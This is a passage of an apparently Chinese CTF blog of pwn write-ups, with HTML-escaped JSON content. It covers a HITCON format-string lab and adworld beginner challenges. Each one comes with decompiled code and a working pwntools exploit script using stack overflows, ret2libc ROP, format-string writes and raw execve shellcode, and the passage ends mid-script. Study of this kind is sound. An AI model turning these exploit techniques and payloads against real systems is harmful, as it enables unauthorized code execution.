class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./playfmt\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./playfmt\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">payload = <span class=\"string\">\"%15$paaaa\"</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">addr = int(p.recvuntil(<span class=\"string\">\"aaaa\"</span>).split(<span class=\"string\">'aaaa'</span>)[<span class=\"number\">0</span>].split(<span class=\"string\">\"\\n\"</span>)[<span class=\"number\">-1</span>],<span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc.address = addr - libc.symbols[<span class=\"string\">'__libc_start_main'</span>] - <span class=\"number\">247</span></span><br><span class=\"line\">system = libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\">binsh = next(libc.search(<span class=\"string\">\"/bin/sh\"</span>))</span><br><span class=\"line\">printfgot = elf.got[<span class=\"string\">'printf'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">payload1 = <span class=\"string\">\"%6$x\"</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">p.sendline(payload1)</span><br><span class=\"line\">ebp2 = int(<span class=\"string\">\"0x\"</span> + p.recvline().strip(), <span class=\"number\">16</span>)</span><br><span class=\"line\">ebp1 = ebp2 - <span class=\"number\">0x10</span></span><br><span class=\"line\">nop2 = ebp2 + <span class=\"number\">0x4</span></span><br><span class=\"line\">nop1 = ebp2 - <span class=\"number\">0xc</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># [ebp2] = nop1</span></span><br><span class=\"line\">payload = <span class=\"string\">\"%\"</span> + str(nop1 &amp; <span class=\"number\">0xffff</span>) + <span class=\"string\">\"c%6$hn\"</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># [nop1] = printgot</span></span><br><span class=\"line\">payload = <span class=\"string\">\"%\"</span> + str(printfgot &amp; <span class=\"number\">0xffff</span>) + <span class=\"string\">\"c%10$hn\"</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># [ebp2] = nop2</span></span><br><span class=\"line\">payload = <span class=\"string\">\"%\"</span> + str(nop2 &amp; <span class=\"number\">0xffff</span>) + <span class=\"string\">\"c%6$hn\"</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># [nop2] = printgot + 2</span></span><br><span class=\"line\">payload = <span class=\"string\">\"%\"</span> + str((printfgot + <span class=\"number\">2</span>) &amp; <span class=\"number\">0xffff</span>) + <span class=\"string\">\"c%10$hn\"</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># [printgot] = system</span></span><br><span class=\"line\">payload = <span class=\"string\">\"%\"</span> + str(system &gt;&gt; <span class=\"number\">16</span> &amp; <span class=\"number\">0xffff</span>) + <span class=\"string\">\"c%11$hn\"</span> + <span class=\"string\">\"%\"</span> + str(((system &amp; <span class=\"number\">0xffff</span>) - (system &gt;&gt; <span class=\"number\">16</span> &amp; <span class=\"number\">0xffff</span>)) &amp; <span class=\"number\">0xffff</span>) + <span class=\"string\">\"c%7$hn\"</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"/bin/sh\\x00\"</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<hr>\n<p>本篇到此为止，接下来是glibc heap exploit的题解。</p>\n","text":"Lab1——sysmagic防护1<br>2<br>3<br>4<br>5<br>6<br>7<br>liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab1$ checksec sysmagic<br>[*] &apos;/home/liwc/pwn","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":5,"path":"api/tags/pwn.json"}]},{"title":"攻防世界刷题——新手练习","slug":"攻防世界刷题——新手练习","date":"2019-03-20T08:15:35.000Z","updated":"2019-04-21T02:59:31.207Z","comments":true,"path":"api/articles/攻防世界刷题——新手练习.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"新手练习\"><a href=\"#新手练习\" class=\"headerlink\" title=\"新手练习\"></a>新手练习</h1><h2 id=\"when-did-you-born\"><a href=\"#when-did-you-born\" class=\"headerlink\" title=\"when_did_you_born\"></a>when_did_you_born</h2><p>gets(&amp;v4)处存在栈溢出，覆盖掉v5，为1926(0x786)即可。</p>\n<p>v4 = rsp+0x0; v5 = rsp + 0x8; 所以偏移为0x8</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __<span class=\"function\">fastcall <span class=\"title\">main</span><span class=\"params\">(__int64 a1, <span class=\"keyword\">char</span> **a2, <span class=\"keyword\">char</span> **a3)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v4; <span class=\"comment\">// [rsp+0h] [rbp-20h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v5; <span class=\"comment\">// [rsp+8h] [rbp-18h]</span></span><br><span class=\"line\">  ...</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"What's Your Birth?\"</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;v5);</span><br><span class=\"line\">  ...</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"What's Your Name?\"</span>);</span><br><span class=\"line\">    gets(&amp;v4);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"You Are Born In %d\\n\"</span>, v5);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v5 == <span class=\"number\">1926</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">\"You Shall Have Flag.\"</span>);</span><br><span class=\"line\">      system(<span class=\"string\">\"cat flag\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./when_did_you_born\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31452</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"What's Your Birth?\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"123\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"What's Your Name?\\n\"</span>)</span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span> * <span class=\"number\">8</span> + <span class=\"string\">\"\\x86\\x07\"</span></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"hello-pwn\"><a href=\"#hello-pwn\" class=\"headerlink\" title=\"hello_pwn\"></a>hello_pwn</h2><p>该题跟上一题类似，也是溢出，不过是溢出全局变量。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __<span class=\"function\">fastcall <span class=\"title\">main</span><span class=\"params\">(__int64 a1, <span class=\"keyword\">char</span> **a2, <span class=\"keyword\">char</span> **a3)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  alarm(<span class=\"number\">0x3C</span>u);</span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"~~ welcome to ctf ~~     \"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"lets get helloworld for bof\"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;unk_601068, <span class=\"number\">0x10</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( dword_60106C == <span class=\"number\">1853186401</span> )</span><br><span class=\"line\">    sub_400686();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0L</span>L;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./hello_pwn\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31454</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"lets get helloworld for bof\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span> * <span class=\"number\">4</span> + <span class=\"string\">\"\\x61\\x61\\x75\\x6e\"</span></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"level0\"><a href=\"#level0\" class=\"headerlink\" title=\"level0\"></a>level0</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/adworld/level0_$ checksec level0 </span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/adworld/level0_/level0&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    No RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<p>同样是栈溢出，同时开启了NX，但是已经布置好system(“/bin/sh”)的函数，直接覆盖eip为0x400596即可。偏移为0x80。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0000000000400596                 public callsystem</span><br><span class=\"line\">.text:0000000000400596 callsystem      proc near</span><br><span class=\"line\">.text:0000000000400596 ; __unwind &#123;</span><br><span class=\"line\">.text:0000000000400596                 push    rbp</span><br><span class=\"line\">.text:0000000000400597                 mov     rbp, rsp</span><br><span class=\"line\">.text:000000000040059A                 mov     edi, offset command ; &quot;/bin/sh&quot;</span><br><span class=\"line\">.text:000000000040059F                 call    _system</span><br><span class=\"line\">.text:00000000004005A4                 pop     rbp</span><br><span class=\"line\">.text:00000000004005A5                 retn</span><br></pre></td></tr></table></figure>\n<p>注意rip后不要再跟多余的padding，否则等callsystem函数返回之后会报错。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./level0\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31457</span>)</span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span> * <span class=\"number\">0x88</span> + p64(<span class=\"number\">0x400596</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Hello, World\\n\"</span>)</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"level2\"><a href=\"#level2\" class=\"headerlink\" title=\"level2\"></a>level2</h2><p>根据提示可知该题是用ROP，即ret2libc。由于没有开启pie和canary，程序也直接调用了system函数，所以很简单，不需要leak libc基地址。用IDA可以找到/bin/sh字符串，然后用栈传参即可。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.data:0804A024 hint            db &apos;/bin/sh&apos;,0</span><br></pre></td></tr></table></figure>\n<p>注意调整栈平衡</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./level2\"</span>)</span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./level2\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31463</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Input:\\n\"</span>)</span><br><span class=\"line\">offset = <span class=\"number\">0x88</span> + <span class=\"number\">4</span></span><br><span class=\"line\">rop = offset * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(elf.plt[<span class=\"string\">'system'</span>])</span><br><span class=\"line\">rop += <span class=\"string\">\"aaaa\"</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">0x804a024</span>)</span><br><span class=\"line\">p.send(rop)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"string\"><a href=\"#string\" class=\"headerlink\" title=\"string\"></a>string</h2><p>该题开启了canary和nx。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/adworld/string$ checksec string </span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/adworld/string/string&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<p>程序大意是类似一个MUD游戏，输入名字，输入east、up等用命令行与游戏交互，控制主角的行动。</p>\n<p>main函数中会首先malloc一个chunk，然后会leak出chunk的地址（即堆中D和U字符的地址）</p>\n<p>在sub_0x400bb9函数中存在格式化字符串漏洞</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">unsigned</span> __<span class=\"function\">int64 <span class=\"title\">sub_400BB9</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  ...</span><br><span class=\"line\">  _isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;v1);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 == <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"A voice heard in your mind\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"'Give me an address'\"</span>);</span><br><span class=\"line\">    _isoc99_scanf(<span class=\"string\">\"%ld\"</span>, &amp;v2);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"And, you wish is:\"</span>);</span><br><span class=\"line\">    _isoc99_scanf(<span class=\"string\">\"%s\"</span>, &amp;format);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Your wish is\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(&amp;format, &amp;format);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"I hear it, I hear it....\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v4;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>而在最后的sub_0x400ca6函数中，如果之前的D和U两个字符相同，就会直接劫持控制流。此时只需要将shellcode布置到这块堆空间就可以了。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( *chunk == chunk[<span class=\"number\">1</span>] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Wizard: I will help you! USE YOU SPELL\"</span>);</span><br><span class=\"line\">    v1 = mmap(<span class=\"number\">0L</span>L, <span class=\"number\">0x1000</span>uLL, <span class=\"number\">7</span>, <span class=\"number\">33</span>, <span class=\"number\">-1</span>, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">    read(<span class=\"number\">0</span>, v1, <span class=\"number\">0x100</span>uLL);</span><br><span class=\"line\">    ((<span class=\"keyword\">void</span> (__fastcall *)(_QWORD, <span class=\"keyword\">void</span> *))v1)(<span class=\"number\">0L</span>L, v1);</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<p>所以利用思路是：通过fs漏洞修改已知地址的D和U两个字符为相同值，然后直接读入shellcode。由于程序首先要求我们输入address，可以将要修改的地址先读入栈中，然后利用v2在栈中的相对偏移写入。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">context.arch = <span class=\"string\">'amd64'</span></span><br><span class=\"line\">shellcode = <span class=\"string\">\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"</span></span><br><span class=\"line\"><span class=\"comment\"># elf = ELF(\"./string\")</span></span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./string\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31504</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"we will tell you two secret ...\\n\"</span>)</span><br><span class=\"line\">addr1 = int(<span class=\"string\">\"0x\"</span> + p.recvline().split(<span class=\"string\">\" \"</span>)[<span class=\"number\">-1</span>], <span class=\"number\">16</span>)</span><br><span class=\"line\">addr2 = int(<span class=\"string\">\"0x\"</span> + p.recvline().split(<span class=\"string\">\" \"</span>)[<span class=\"number\">-1</span>], <span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(addr1),hex(addr2)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"What should your character's name be:\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"liwc\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"So, where you will go?east or up?:\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"east\"</span>)</span><br><span class=\"line\">offset = <span class=\"number\">7</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"go into there(1), or leave(0)?:\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"'Give me an address'\\n\"</span>)</span><br><span class=\"line\">p.sendline(str(addr1))</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"And, you wish is:\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">\"%085d%7$n\"</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(shellcode)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"guess-num\"><a href=\"#guess-num\" class=\"headerlink\" title=\"guess_num\"></a>guess_num</h2><p>该题也是栈溢出漏洞的利用，只需要覆盖掉srand函数的随机种子，然后就可以预测出rand()的序列，得到shell。</p>\n<p>预测序列的C程序如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">  srand(<span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt;= <span class=\"number\">9</span>;++i) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> num = rand() % <span class=\"number\">6</span> + <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d \"</span>, num);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>相应的exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">context.arch = <span class=\"string\">'amd64'</span></span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./guess_num\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31574</span>)</span><br><span class=\"line\">numbers = [<span class=\"number\">2</span>,<span class=\"number\">5</span>,<span class=\"number\">4</span>,<span class=\"number\">2</span>,<span class=\"number\">6</span>,<span class=\"number\">2</span>,<span class=\"number\">5</span>,<span class=\"number\">1</span>,<span class=\"number\">4</span>,<span class=\"number\">2</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span> * <span class=\"number\">0x20</span> + p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"name:\"</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">10</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Please input your guess number:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(numbers[i]))</span><br><span class=\"line\"></span><br><span 